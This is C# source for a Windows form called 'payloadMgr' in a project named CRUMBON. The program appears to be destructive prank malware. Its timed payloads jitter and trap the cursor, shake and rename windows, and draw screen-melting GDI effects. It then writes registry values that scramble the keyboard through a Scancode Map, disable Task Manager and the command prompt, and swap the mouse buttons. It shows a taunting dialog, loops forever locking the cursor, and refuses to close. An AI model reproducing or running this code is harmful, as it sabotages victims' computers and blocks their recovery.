using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Net.WebSockets;
using System.Reflection.Metadata;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;

namespace CRUMBON
{
    public partial class payloadMgr : Form
    {

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        static extern int SetWindowText(nint hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        static extern bool GetWindowRect(IntPtr hWnd, out WindowRect rect);

        [StructLayout(LayoutKind.Sequential)]
        private struct WindowRect
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [DllImport("user32.dll")]
        static extern int SetWindowPos(nint hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

        [DllImport("user32.dll")]
        static extern int MoveWindow(IntPtr handle, int x, int y, int width, int height, bool redraw);
        int hyger = 1;
        public payloadMgr()
        {
            InitializeComponent();
        }
        private void py1_Tick(object sender, EventArgs e)
        {
            jtm(1);
            hyger = 69420;
        }

        private void py1end_Tick(object sender, EventArgs e)
        {
            SystemSounds.Asterisk.Play();
            py1.Enabled = false;
            py2.Enabled = true;
            py1end.Enabled = false;
            py2end.Enabled = true;
        }

        private void py2_Tick(object sender, EventArgs e)
        {
            var r = new Random();
            int g = r.Next(1, 500);
            if (g == 2) { SystemSounds.Asterisk.Play(); }
            if (g == 3) { SystemSounds.Hand.Play(); }
            jtm(2);
        }

        public void sle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                StringBuilder sb = new StringBuilder();
                sb.Append(chargen.gen());
                SetWindowText(handle, sb, 30);
            }
        }
        private void jtm(int amt)
        {
            var r = new Random();
            this.Cursor = new Cursor(Cursor.Current.Handle);
            Cursor.Position = new System.Drawing.Point(Cursor.Position.X + r.Next(-amt, amt + 1), Cursor.Position.Y + r.Next(-amt, amt + 1));
            Cursor.Clip = new Rectangle(this.Location, this.Size);
        }
        public void jgl(int amt)
        {
            const short SWP_NOSIZE = 1;
            const short SWP_NOZORDER = 0X4;
            const int SWP_SHOWWINDOW = 0x0040;
            var r = new Random();
            IntPtr handle = GetForegroundWindow();
            WindowRect rect = new WindowRect();
            GetWindowRect(handle, out rect);
            int xpos = rect.Left; int ypos = rect.Top;
            if (handle != IntPtr.Zero)
            {
                SetWindowPos(handle, 0, xpos + r.Next(-amt, amt + 1), ypos + r.Next(-amt, amt + 1), 0, 0, SWP_NOZORDER | SWP_NOSIZE | SWP_SHOWWINDOW);
            }

        }

        private void py2end_Tick(object sender, EventArgs e)
        {

            py2.Enabled = false;
            py2end.Enabled = false;
            py3.Enabled = true;
            py3end.Enabled = true;
        }

        private void py3_Tick(object sender, EventArgs e)
        {
            var r = new Random();
            jtm(2);
            int g = r.Next(1, 450);
            if (g == 2) { SystemSounds.Asterisk.Play(); }
            if (g == 3) { SystemSounds.Hand.Play(); }
            if (g >= 4 && g <= 104) { jgl(1); }
        }

        private void py3end_Tick(object sender, EventArgs e)
        {
            py3.Enabled = false;
            py3end.Enabled = false;
            py4.Enabled = true;
            py4end.Enabled = true;
        }

        private void py4_Tick(object sender, EventArgs e)
        {
            var r = new Random();
            GDI.drawIco(true);
            int g = r.Next(1, 400);
            if (g == 2) { SystemSounds.Asterisk.Play(); }
            if (g == 3) { SystemSounds.Hand.Play(); }
            if (g >= 4 && g <= 104) { GDI.melt(); }
        }

        private void py4end_Tick(object sender, EventArgs e)
        {
            py4.Enabled = false;
            py4end.Enabled = false;
            py5.Enabled = true;
            py5end.Enabled = true;

        }

        private void py5_Tick(object sender, EventArgs e)
        {
            var r = new Random();
            int g = r.Next(1, 350);
            jtm(3);
            sle();
            if (g == 2) { SystemSounds.Asterisk.Play(); }
            if (g == 3) { SystemSounds.Hand.Play(); }
            if (g == 4) { GDI.drawIco(false); }
            if (g >= 5 && g <= 105) { jgl(2); }
            if (g >= 205 && g <= 305) { sle(); }
        }

        private void py5end_Tick(object sender, EventArgs e)
        {
            py5.Enabled = false;
            py5end.Enabled = false;
            py6.Enabled = true;
            py6end.Enabled = true;
        }

        private void py6_Tick(object sender, EventArgs e)
        {
            var r = new Random();
            int g = r.Next(1, 350);
            jtm(5);
            sle();
            if (g == 2 || g == 202) { SystemSounds.Asterisk.Play(); }
            if (g == 3 || g == 203) { SystemSounds.Hand.Play(); }
            if (g == 4 || g == 204) { GDI.drawIco(false); }
            if (g == 5) { GDI.Invert(); }
            if (g == 6) { GDI.Blur(); }
            if (g >= 7 && g <= 201) { jgl(3); GDI.drawIco(true); }
        }

        private void py6end_Tick(object sender, EventArgs e)
        {
            py6.Enabled = false;
            py6end.Enabled = false;
            py7.Enabled = true;
            py7end.Enabled = true;
        }

        private void py7end_Tick(object sender, EventArgs e)
        {
            py7.Enabled = false;
            py7end.Enabled = false;
            py8.Enabled = true;
            //py8end.Enabled = true;
        }

        private void py7_Tick(object sender, EventArgs e)
        {
            var r = new Random();
            int g = r.Next(1, 250);
            jtm(9);
            sle();
            GDI.drawIco(false);
            if (g == 2 || g == 202) { SystemSounds.Asterisk.Play(); }
            if (g == 3 || g == 203) { SystemSounds.Hand.Play(); }
            if (g == 4 || g == 204) { GDI.drawIco(false); }
            if (g == 5 || g == 205) { GDI.HatchBr(); }
            if (g == 6 || g == 206) { GDI.Blur(); }
            if (g == 7 || g == 207) { GDI.melt(); }
            if (g == 8 || g == 208) { GDI.moveup(); }
            if (g >= 9 && g <= 201) { jgl(10); GDI.drawIco(true); }
        }

        private void payloadMgr_Shown(object sender, EventArgs e)
        {


        }

        private void py8_Tick(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Maximized;
        }

        private void payloadMgr_Load(object sender, EventArgs e)
        {

        }

        private void payloadMgr_Enter(object sender, EventArgs e)
        {

        }

        private void payloadMgr_MaximumSizeChanged(object sender, EventArgs e)
        {
        }
        public void lockcursor()
        {
            var r = new Random();
            this.Cursor = new Cursor(Cursor.Current.Handle);
            Cursor.Position = new System.Drawing.Point(r.Next(0,(int)SystemParameters.PrimaryScreenWidth), r.Next(0, (int)SystemParameters.PrimaryScreenHeight));
            Cursor.Clip = new Rectangle(this.Location, this.Size);
        }
        int fart = 1;
        private void payloadMgr_MouseEnter(object sender, EventArgs e)
        {
            if (fart == 1)
            {
                this.WindowState = FormWindowState.Maximized;
                py1.Enabled = false;
                py8.Enabled = false;
                py2.Enabled = false;
                py3.Enabled = false;
                py4.Enabled = false;
                py5.Enabled = false;
                py6.Enabled = false;
                py7.Enabled = false;
                py1end.Enabled = false;
                py2end.Enabled = false;
                py3end.Enabled = false;
                py4end.Enabled = false;
                py5end.Enabled = false;
                py6end.Enabled = false;
                py7end.Enabled = false;
                this.WindowState = FormWindowState.Maximized;
                this.Show();
                lockcursor();
                fart = 69420;
                byte[] hax_value = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3B, 0x00, 0x00, 0x00, 0x4D, 0xE0, 0x50, 0xE0, 0x50, 0xE0, 0x4B, 0xE0, 0x48, 0xE0, 0x4D, 0xE0, 0x4B, 0xE0, 0x48, 0xE0, 0x21, 0xE0, 0x3B, 0x00, 0x21, 0xE0, 0x44, 0x00, 0x21, 0xE0, 0x57, 0x00, 0x21, 0xE0, 0x58, 0x00, 0x21, 0xE0, 0x3C, 0x00, 0x21, 0xE0, 0x3D, 0x00, 0x21, 0xE0, 0x3E, 0x00, 0x21, 0xE0, 0x3F, 0x00, 0x21, 0xE0, 0x40, 0x00, 0x21, 0xE0, 0x41, 0x00, 0x21, 0xE0, 0x42, 0x00, 0x21, 0xE0, 0x43, 0x00, 0x23, 0x00, 0x1E, 0x00, 0x12, 0x00, 0x30, 0x00, 0x14, 0x00, 0x2E, 0x00, 0x21, 0x00, 0x20, 0x00, 0x30, 0x00, 0x12, 0x00, 0x20, 0x00, 0x21, 0x00, 0x1F, 0x00, 0x22, 0x00, 0x1E, 0x00, 0x23, 0x00, 0x26, 0x00, 0x17, 0x00, 0x19, 0x00, 0x24, 0x00, 0x18, 0x00, 0x25, 0x00, 0x17, 0x00, 0x26, 0x00, 0x10, 0x00, 0x32, 0x00, 0x11, 0x00, 0x31, 0x00, 0x25, 0x00, 0x18, 0x00, 0x24, 0x00, 0x19, 0x00, 0x32, 0x00, 0x10, 0x00, 0x2F, 0x00, 0x13, 0x00, 0x22, 0x00, 0x1F, 0x00, 0x2E, 0x00, 0x14, 0x00, 0x2C, 0x00, 0x16, 0x00, 0x13, 0x00, 0x2F, 0x00, 0x31, 0x00, 0x11, 0x00, 0x15, 0x00, 0x2D, 0x00, 0x2D, 0x00, 0x15, 0x00, 0x16, 0x00, 0x2C, 0x00, 0x39, 0x00, 0x0E, 0x00, 0x2A, 0x00, 0x3A, 0x00, 0x00, 0x00, 0x53, 0xE0, 0x0F, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x1D, 0x00, 0x3A, 0x00, 0x2A, 0x00, 0x1D, 0x00, 0x45, 0x00, 0x53, 0xE0, 0x37, 0xE0, 0x00, 0x00, 0x38, 0xE0, 0x00, 0x00, 0x1D, 0xE0, 0x3A, 0x00, 0x36, 0x00, 0x38, 0x00, 0x46, 0x00, 0x0E, 0x00, 0x39, 0x00, 0x1C, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00 };
                RegistryKey reg_scancode = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout");
                reg_scancode.SetValue("Scancode Map", hax_value, RegistryValueKind.Binary);
                RegistryKey reg_task = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg_task.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                RegistryKey reg_cmd = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
                reg_cmd.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
                RegistryKey reg_swap = Registry.CurrentUser.CreateSubKey("Control Panel\\Mouse");
                reg_swap.SetValue("SwapMouseButtons", "1", RegistryValueKind.String);
                reg_task.Close(); reg_scancode.Close(); reg_cmd.Close(); reg_swap.Close();
                Form1.TaskBox(new Form3(), false, "CRUMBON", "There's nothing you can do now", "Task manager has been disabled." +
                        "\nCommand prompt has been disabled." +
                        "\nYour mouse is switched." +
                        "\nYou have to restart, but your keyboard is going to be all scrambled." +
                        "\nControl, Alt, Delete, and Esacpe will be disabled.", true, "You must restart, I am unable to", TaskDialogIcon.Error);

                while (true)
                {
                    lockcursor();
                                    }
            }
        }

        private void payloadMgr_FormClosing(object sender, FormClosingEventArgs e)
        {
            Form1.TaskBox(new Form3(), false, "CRUMBON", "There's nothing you can do now", "Task manager has been disabled." +
                        "\nCommand prompt has been disabled." +
                        "\nYour mouse is switched." +
                        "\nYou have to restart, but your keyboard is going to be all scrambled." +
                        "\nControl, Alt, Delete, and Esacpe will be disabled.", true, "You must restart, I am unable to", TaskDialogIcon.Error);
            e.Cancel = true;
        }
    }
}

